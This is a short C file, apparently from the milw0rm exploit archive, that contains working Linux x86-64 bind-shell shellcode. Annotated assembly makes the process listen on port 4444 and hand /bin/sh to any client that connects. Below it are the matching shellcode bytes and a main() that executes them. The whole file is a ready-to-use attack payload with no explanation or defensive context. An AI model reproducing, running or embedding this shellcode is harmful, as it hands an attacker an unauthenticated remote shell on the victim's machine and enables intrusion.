/*
linux/x86-64  bindshell(port 4444)
xi4oyu [at] 80sec.com
http://www.80sec.com


BITS 64
xor eax,eax
xor ebx,ebx
xor edx,edx
;socket
mov al,0x1
mov esi,eax
inc al
mov edi,eax
mov dl,0x6
mov al,0x29
syscall
xchg ebx,eax ;store the server sock
;bind
xor  rax,rax
push   rax
push 0x5c110102
mov  [rsp+1],al
mov  rsi,rsp
mov  dl,0x10
mov  edi,ebx
mov  al,0x31
syscall
;listen
mov  al,0x5
mov esi,eax
mov  edi,ebx
mov  al,0x32
syscall
;accept
xor edx,edx
xor esi,esi
mov edi,ebx
mov al,0x2b
syscall
mov edi,eax ; store sock
;dup2
xor rax,rax
mov esi,eax
mov al,0x21
syscall
inc al
mov esi,eax
mov al,0x21
syscall
inc al
mov esi,eax
mov al,0x21
syscall
;exec
xor rdx,rdx
mov rbx,0x68732f6e69622fff
shr rbx,0x8
push rbx
mov rdi,rsp
xor rax,rax
push rax
push rdi
mov  rsi,rsp
mov al,0x3b
syscall
push rax
pop  rdi
mov al,0x3c
syscall
*/

main() {
        char shellcode[] =
        "\x31\xc0\x31\xdb\x31\xd2\xb0\x01\x89\xc6\xfe\xc0\x89\xc7\xb2"
        "\x06\xb0\x29\x0f\x05\x93\x48\x31\xc0\x50\x68\x02\x01\x11\x5c"
        "\x88\x44\x24\x01\x48\x89\xe6\xb2\x10\x89\xdf\xb0\x31\x0f\x05"
        "\xb0\x05\x89\xc6\x89\xdf\xb0\x32\x0f\x05\x31\xd2\x31\xf6\x89"
        "\xdf\xb0\x2b\x0f\x05\x89\xc7\x48\x31\xc0\x89\xc6\xb0\x21\x0f"
        "\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21"
        "\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68"
        "\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89"
        "\xe6\xb0\x3b\x0f\x05\x50\x5f\xb0\x3c\x0f\x05";

        (*(void (*)()) shellcode)();
}

// milw0rm.com [2009-05-18]